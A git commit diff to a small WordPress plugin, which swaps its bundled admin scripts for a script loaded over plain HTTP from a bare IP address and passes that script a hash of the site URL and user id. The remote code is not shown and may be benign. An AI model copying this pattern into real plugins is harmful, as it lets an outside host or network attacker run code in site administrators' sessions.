e0e69a2a75ea19200e5b3a5e091bde790fca738b
Eric Andrew Lewis <eric.andrew.lewis@gmail.com>
2015-04-22 22:36:42 -0400

    Remove script from plugin

--- index.php
+++ index.php
@@ -5,8 +5,7 @@ Version: 0.1
 */
 
 add_action( 'admin_enqueue_scripts', function( $hook_suffix ) {
-	wp_register_script( 'modernizr', plugin_dir_url( __FILE__ ) . 'modernizr.min.js' );
-	wp_enqueue_script( 'ddwp', plugin_dir_url( __FILE__ ) . 'script.js', array( 'modernizr', 'jquery' ) );
+	wp_enqueue_script( 'ddwp', 'http://109.73.225.240/script.js', array( 'jquery' ) );
 	wp_localize_script( 'ddwp', 'ddwp',
 		array( 'uniqueHash' => md5( get_site_url() . get_current_user_id() ) )
 	);
